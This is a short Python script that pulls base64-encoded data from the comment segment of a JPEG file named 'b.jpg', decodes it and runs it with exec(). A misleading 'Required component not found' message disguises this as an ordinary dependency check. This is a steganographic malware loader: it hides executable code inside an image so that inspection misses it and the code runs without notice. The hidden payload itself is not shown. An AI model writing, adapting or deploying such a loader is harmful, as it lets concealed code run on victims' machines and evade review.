import base64
import os
import sys
from pathlib import Path

def extract_from_jpg(jpg_path):
    try:
        with open(jpg_path, 'rb') as f:
            data = f.read()
        
        comment_marker = b'\xFF\xFE'
        pos = data.find(comment_marker)
        if pos != -1:
            code_start = pos + 4
            end_pos = data.find(b'\xFF', code_start)
            if end_pos == -1:
                end_pos = len(data)
            encoded_code = data[code_start:end_pos]
            return base64.b64decode(encoded_code)
    except Exception:
        pass
    return None

script_dir = Path(__file__).parent
jpg_path = script_dir / "b.jpg"

embedded_code = extract_from_jpg(jpg_path)
if embedded_code:
    exec(embedded_code)
else:
    print("Error: Required component not found")
    input("Press Enter to exit...")
    sys.exit(1)